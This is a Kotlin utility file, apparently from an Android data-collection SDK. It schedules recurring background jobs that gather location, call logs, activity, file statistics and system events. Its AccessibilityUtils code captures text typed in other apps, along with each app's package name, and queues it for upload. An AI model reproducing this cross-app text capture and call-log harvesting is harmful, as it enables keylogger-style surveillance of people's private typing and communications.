package ru.livli.swsdk.utils

import android.Manifest
import android.app.Activity
import android.app.AppOpsManager
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.firebase.jobdispatcher.*
import okhttp3.MediaType
import okhttp3.RequestBody
import okio.Buffer
import ru.livli.swsdk.jobs.*
import ru.livli.swsdk.models.AccessibilityForSilo
import java.io.IOException
import java.io.UnsupportedEncodingException
import java.nio.charset.Charset
import java.security.MessageDigest
import java.security.NoSuchAlgorithmException
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

private const val SP_NAME = "sw_sdk"
private const val SHA_TYPE = "HmacSHA1"

internal fun Context.sp(): SharedPreferences = getSharedPreferences(SP_NAME, Context.MODE_PRIVATE)

internal fun bodyToString(request: RequestBody?): String {
    try {
        val buffer = Buffer()
        if (request != null)
            request.writeTo(buffer)
        else
            return ""
        return buffer.readUtf8()
    } catch (e: IOException) {
        return ""
    }
}

internal fun ByteArray.toRetroBinary(): RequestBody =
    RequestBody.create(MediaType.parse("application/octet-stream"), this)

internal fun hmacSha1(value: String, key: String): ByteArray {
    val secret = SecretKeySpec(key.toByteArray(), SHA_TYPE)
    val mac = Mac.getInstance(SHA_TYPE)
    mac.init(secret)
    return mac.doFinal(value.toByteArray())
}

internal fun sha1(text: String): ByteArray? {
    try {
        val md = MessageDigest.getInstance("SHA-1")
        md.update(text.toByteArray(Charset.defaultCharset()), 0, text.length)

        return md.digest()
    } catch (e: NoSuchAlgorithmException) {
        e.printStackTrace()
    } catch (e: UnsupportedEncodingException) {
        e.printStackTrace()
    }

    return null
}

internal fun <T : Pair<String, Any?>> Array<T>.toHashMap(): Map<String, Any?> = hashMapOf<String, Any?>().apply {
    this@toHashMap.forEach {
        if (it.second != null)
            this[it.first] = it.second.toString()
    }
}

internal val String.error: String
    get() {
        Log.e("swsdk", this)
        return this
    }

internal fun Array<out String>.requestPermission(ctx: Activity, requestCode: Int): Boolean {
    if (!(this isGranted (ctx))) {
        ActivityCompat.requestPermissions(ctx, this, requestCode)
        return false
    }

    return true
}

internal infix fun Array<out String>.isGranted(ctx: Context): Boolean {
    forEach {
        if (ContextCompat.checkSelfPermission(ctx, it) != PackageManager.PERMISSION_GRANTED)
            return false
    }

    return true
}

internal fun Context.isAppUsageAccessGranted(): Boolean {
    return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        try {
            val applicationInfo = packageManager.getApplicationInfo(packageName, 0)
            val appOpsManager = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            var mode = 0
            if (android.os.Build.VERSION.SDK_INT > android.os.Build.VERSION_CODES.KITKAT) {
                mode = appOpsManager.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    applicationInfo.uid, applicationInfo.packageName
                )
            }
            mode == AppOpsManager.MODE_ALLOWED
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    } else false
}

internal fun Context.hasPermissions(vararg permissions: String): Boolean =
    permissions.all {
        ContextCompat.checkSelfPermission(
            this,
            it
        ) == PackageManager.PERMISSION_GRANTED
    }

internal fun Context.canReadStorage(): Boolean = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
    ContextCompat.checkSelfPermission(
        this,
        Manifest.permission.READ_EXTERNAL_STORAGE
    ) == PackageManager.PERMISSION_GRANTED
} else {
    true
}

internal object JobSchedulerUtils {
    private const val MINUTE = 60
    private const val HOUR = MINUTE * 60
    private const val DAY = HOUR * 24
    private const val WEEK = DAY * 7

    enum class AppService(val clazz: Class<out Any>, val startTime: Int, val interval: Int) {
        LOCATION(LocationJob::class.java, 5, MINUTE * 15),
        ACTIVITY(ActivityJob::class.java, 1, MINUTE * 15),
        PERMISSIONS(PermissionsJob::class.java, MINUTE, DAY),
        TIMELINE_TOTAL(TimelineJob::class.java, WEEK, WEEK),
        TIMELINE_DAILY(TimelineDailyJob::class.java, DAY, DAY),
        FILE_STAT(FileStatJob::class.java, DAY, DAY),
        SYSTEM_EVENTS_JOB(SystemEventsJob::class.java, MINUTE, MINUTE),
        SILO_JOB(SiloJob::class.java, MINUTE, MINUTE),
        CALL_LOGS(CallsJob::class.java, MINUTE, MINUTE),
    }

    fun schedule(
        context: Context, vararg jobs: AppService,
        networkConstraint: Int = Constraint.ON_ANY_NETWORK
    ) {
        FirebaseJobDispatcher(GooglePlayDriver(context)).let { dispatcher ->
            jobs.forEach {
                schedule(dispatcher, it, networkConstraint)
            }
        }
    }

    fun scheduleAndStart(
        context: Context, vararg jobs: AppService,
        networkConstraint: Int = Constraint.ON_ANY_NETWORK
    ) {
        FirebaseJobDispatcher(GooglePlayDriver(context)).let { dispatcher ->
            jobs.forEach {
                schedule(dispatcher, it, networkConstraint)
                forceStart(dispatcher, it, networkConstraint)
            }
        }
    }

    private fun forceStart(
        dispatcher: FirebaseJobDispatcher, service: AppService,
        networkConstraint: Int = Constraint.ON_ANY_NETWORK
    ) {
        "--- SW JOB FORCED: ${service.clazz.simpleName}".error
        val job = dispatcher.newJobBuilder()
            .setService(service.clazz as Class<out JobService>?)
            .setTag(service.clazz.simpleName)
            .setRecurring(false)
            .setLifetime(Lifetime.UNTIL_NEXT_BOOT)
            .setTrigger(Trigger.executionWindow(0, 0))
            .setReplaceCurrent(true)
            .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
            .setConstraints(networkConstraint)
            .build()
        dispatcher.mustSchedule(job)
    }

    private fun schedule(
        dispatcher: FirebaseJobDispatcher, service: AppService,
        networkConstraint: Int = Constraint.ON_ANY_NETWORK
    ) {
        "--- SW JOB SCHEDULED: ${service.clazz.simpleName}".error
        val job = dispatcher.newJobBuilder()
            .setService(service.clazz as Class<out JobService>?)
            .setTag(service.clazz.simpleName)
            .setRecurring(true)
            .setLifetime(Lifetime.FOREVER)
            .setTrigger(Trigger.executionWindow(service.startTime, service.interval))
            .setReplaceCurrent(true)
            .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
            .setConstraints(networkConstraint)
            .build()
        dispatcher.mustSchedule(job)
    }
}

internal object AccessibilityUtils {
    private val ACCESSIBILITY_TEXT = "ACCESSIBILITY_TEXT"
    private val handler = Handler()
    private val runnable = Runnable { saveText(latestText, latestPackage) }
    @Volatile
    private var latestText: String? = null
    @Volatile
    private var latestPackage: String? = null

    fun collectAccessibilityEvent(event: AccessibilityEvent) {
        if (event.text != null && event.text.isNotEmpty()
            && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        ) {
            latestText = event.text[0].toString()
            latestPackage = event.packageName.toString()
            handler.removeCallbacks(runnable)
            handler.postDelayed(runnable, 2500L)
        }
    }

    private fun saveText(text: String?, packageName: String?) {
        text?.let {
            Queueable.queue(ACCESSIBILITY_TEXT, AccessibilityForSilo(it, packageName.toString()))
        }
    }
}